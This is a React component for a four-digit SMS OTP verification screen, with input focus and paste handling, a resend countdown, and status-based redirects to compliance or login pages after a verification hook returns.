import React, { useRef, useState, useEffect } from "react";
import "./otp.css";
import { useNavigate } from "react-router-dom";
import { useVerification } from "../hooks/useVerification";

const OtpVerification = ({ length = 4, client, myFuncs }) => {
  // autoFocus = true,
  const { name, number } = client;
  const { setOtp } = myFuncs;
  const navigate = useNavigate();
  const [otpp, setOtpp] = useState(Array(length).fill(""));
  const inputRefs = useRef([]);
  const [timer, setTimer] = useState(60);
  // const [wronh, setwronh] = useState(false);
  const [next, setNext] = useState();
  const [wrongCode, setwrongCode] = useState(false);
  const timerZero = timer > 0;
  const countryCode = 263;
  // const number = "0712321432";
  const intervalRef = useRef(null);

  const { status, loading, error, startVerification, reset } =
    useVerification();

  const statusMessages = {
    pending: "⏳ Verifying...",
    approved: "✅ Verified! Redirecting...",
    wrong_code: "❌ Wrong OTP code. Please try again.",
    wrong_pin: "❌ Wrong PIN. Please try again.",
    expired: "⏰ Time expired. Please restart verification.",
    resend_requested: "🔄 OTP resend requested...",
  };

  // All hooks must be called before any conditional returns
  useEffect(() => {
    intervalRef.current = setInterval(() => {
      setTimer((prevCount) => {
        if (prevCount <= 1) {
          clearInterval(intervalRef.current);
          return 0;
        }
        return prevCount - 1;
      });
    }, 1000);
    return () => {
      if (intervalRef.current) {
        clearInterval(intervalRef.current);
      }
    };
  }, [timer]);

  const handleSubmit = async (e) => {
    setwrongCode(false);
    e.preventDefault();
    const myotp = otpp.join("");

    const userData = {
      phoneNumber: number,
      otpCode: myotp,
      countryCode,
      userId: `user_${Date.now()}`,
      userName: name,
    };

    try {
      await startVerification(userData);
    } catch (err) {
      console.error("Verification error:", err);
    }
  };

  function resetTimer() {
    setTimer(120);
  }

  const handleChange = (index, value) => {
    if (!/^\d*$/.test(value)) return;

    const newOtp = [...otpp];
    newOtp[index] = value.slice(-1);
    setOtpp(newOtp);

    if (value !== "" && index < length - 1) {
      inputRefs.current[index + 1].focus();
    }
  };

  const handleKeyDown = (index, e) => {
    if (e.key === "Backspace") {
      e.preventDefault();

      if (otpp[index] !== "") {
        const newOtp = [...otpp];
        newOtp[index] = "";
        setOtpp(newOtp);
      } else if (index > 0) {
        const newOtp = [...otpp];
        newOtp[index - 1] = "";
        setOtpp(newOtp);
        inputRefs.current[index - 1].focus();
      }
    }

    if (e.key === "ArrowLeft" && index > 0) {
      inputRefs.current[index - 1].focus();
    }

    if (e.key === "ArrowRight" && index < length - 1) {
      inputRefs.current[index + 1].focus();
    }
  };

  const handlePaste = (e) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData("text").trim();
    const numbersOnly = pastedData.replace(/\D/g, "");

    if (numbersOnly.length === length) {
      const newOtp = numbersOnly.split("").slice(0, length);
      setOtpp(newOtp);
      inputRefs.current[length - 1].focus();
    } else if (numbersOnly.length > 0) {
      const newOtp = [...otpp];
      const charsToFill = Math.min(numbersOnly.length, length);

      for (let i = 0; i < charsToFill; i++) {
        newOtp[i] = numbersOnly[i];
      }

      setOtpp(newOtp);
      const nextIndex = Math.min(charsToFill, length - 1);
      inputRefs.current[nextIndex].focus();
    }
  };

  const clearOTP = () => {
    resetTimer();
    setOtpp(Array(length).fill(""));
    inputRefs.current[0].focus();
  };

  const handleFocus = (e) => {
    e.target.select();
  };

  function handleSubmission() {
    setNext(true);
    const combinedOtp = otpp.join("");
    setOtp(combinedOtp);
  }

  // function handleNext() {
  //   setNext(false);
  //   navigate("/compliance");
  // }

  // NOW place conditional returns after all hooks
  if (status === "approved") {
    setTimeout(() => {
      console.log("approved");
      navigate("/compliance");
    }, 2000);

    return (
      <div className="otp-container">
        <div className="verification-success">
          <h2>✅ Verification Successful!</h2>
          <p>You will be redirected shortly...</p>
        </div>
      </div>
    );
  }

  if (status === "wrong_pin") {
    setTimeout(() => {
      console.log("wrong pin");
      navigate("/login");
    }, 2000);

    return (
      <div className="otp-container">
        <div className="verification-success">
          <h2 style={{ color: "red" }}> Your pin is wrong!</h2>
          <p>Returning to login...</p>
        </div>
      </div>
    );
  }

  // if (status === "wrong_code") {
  //   setTimeout(() => {
  //     // console.log("wrong pin");
  //     navigate("/otpverification");
  //   }, 2000);

  //   return (
  //     <div className="otp-container">
  //       <div className="verification-success">
  //         <h2 style={{ color: "red" }}> Wrong code provided!</h2>
  //         <p>Try Again...</p>
  //       </div>
  //     </div>
  //   );
  // }
  if (status === "wrong_code") {
    setTimeout(() => {
      // setwrongCode(false);
      setwrongCode(true);
    }, 3000);
  }

  // Main return at the end
  return (
    <div className="otp-container">
      {/* {sessionId && "hello"}({" "} */}
      <>
        <div className="otpheader">
          {error && <div className="error-message">{error}</div>}{" "}
          <h2>OTP Verification</h2>
          <p>
            Enter the OTP sent to your number (sms) <br></br>
            <span>{number}</span>
          </p>
        </div>
        <div className="otp-inputs">
          {otpp.map((digit, index) => (
            <input
              key={index}
              ref={(el) => (inputRefs.current[index] = el)}
              type="text"
              inputMode="numeric"
              maxLength="1"
              value={digit}
              onChange={(e) => handleChange(index, e.target.value)}
              onKeyDown={(e) => handleKeyDown(index, e)}
              onPaste={handlePaste}
              onFocus={handleFocus}
              className={`otp-input ${digit ? "filled" : ""}`}
              autoComplete="one-time-code"
            />
          ))}
        </div>
        {wrongCode && (
          <div className="error-message">
            ❌ Wrong OTP code. Please try again.
          </div>
        )}
        {timer === 0 ? (
          <p className="resindp">You can now resend OTP</p>
        ) : (
          <p className="resindp">Resend OTP in {timer} seconds</p>
        )}
        <div className="otp-display">
          <p>
            Your OTP: <strong>{otpp.join("") || "______"}</strong>
          </p>
          {!next ? (
            <button
              onClick={handleSubmit}
              className="copy-btn"
              type="button"
              disabled={otpp.join("").length !== length}
            >
              {statusMessages[status] || (
                <p>{loading ? "Sending..." : "Submit OTP"}</p>
              )}
            </button>
          ) : (
            <button
              onClick={handleSubmission}
              className="copy-btn"
              type="button"
              disabled={otpp.join("").length !== length}
            >
              Finish
            </button>
          )}
          <div className="otp-actions">
            <button
              onClick={clearOTP}
              className="clear-btn"
              disabled={timerZero}
              type="button"
            >
              Resend OTP
            </button>
            {status === "expired" && (
              <button onClick={reset} className="retry-button">
                ↻ Try Again
              </button>
            )}
          </div>
        </div>
      </>
    </div>
  );
};

export default OtpVerification;
